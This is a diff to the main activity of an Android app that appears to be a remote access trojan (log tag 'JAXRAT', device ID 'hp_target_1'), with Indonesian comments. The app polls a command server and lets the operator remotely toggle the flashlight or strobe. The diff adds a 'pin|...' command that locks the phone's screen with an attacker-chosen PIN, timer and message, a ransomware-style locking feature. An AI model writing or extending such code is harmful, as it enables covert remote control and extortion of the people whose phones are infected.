@@ -18,7 +18,6 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class MainActivity extends Activity {
-    // PASTIKAN IP INI SESUAI DENGAN TERMINAL FLASK KAMU
     private static final String SERVER_URL = "http://192.168.1.49:5000"; 
     private static final String DEVICE_ID = "hp_target_1"; 
     
@@ -33,7 +32,6 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
-        
         try {
             for (String id : cameraManager.getCameraIdList()) {
                 CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
@@ -47,7 +45,6 @@ public class MainActivity extends Activity {
         } catch (CameraAccessException e) {
             Log.e("JAXRAT", "Kamera error", e);
         }
-
         startPolling();
     }
 
@@ -98,19 +95,33 @@ public class MainActivity extends Activity {
         } else if (cmd.equals("STOP_ALL")) {
             stopStrobe(); setTorch(false);
         } else if (cmd.equals("lock_device")) {
+            // Tes Dummy
             Intent intent = new Intent(MainActivity.this, LockScreenActivity.class);
+            intent.putExtra("TIMER", 60);
+            intent.putExtra("PESAN", "Tes Kunci Layar");
+            intent.putExtra("PIN", "1234");
             startActivity(intent);
+        } else if (cmd.startsWith("pin|")) {
+            // Format: pin|timer|suara|getar|volume|pesan|pin
+            String[] parts = cmd.split("\\|");
+            if (parts.length >= 7) {
+                long timer = Long.parseLong(parts[1]);
+                String pesan = parts[5];
+                String pin = parts[6];
+                
+                Intent intent = new Intent(MainActivity.this, LockScreenActivity.class);
+                intent.putExtra("TIMER", timer);
+                intent.putExtra("PESAN", pesan);
+                intent.putExtra("PIN", pin);
+                startActivity(intent);
+            }
         }
     }
 
     private void setTorch(boolean state) {
         try {
-            if (cameraId != null) {
-                cameraManager.setTorchMode(cameraId, state);
-            }
-        } catch (CameraAccessException e) {
-            Log.e("JAXRAT", "Gagal nyalain senter", e);
-        }
+            if (cameraId != null) cameraManager.setTorchMode(cameraId, state);
+        } catch (CameraAccessException e) { }
     }
 
     private void startStrobe() {
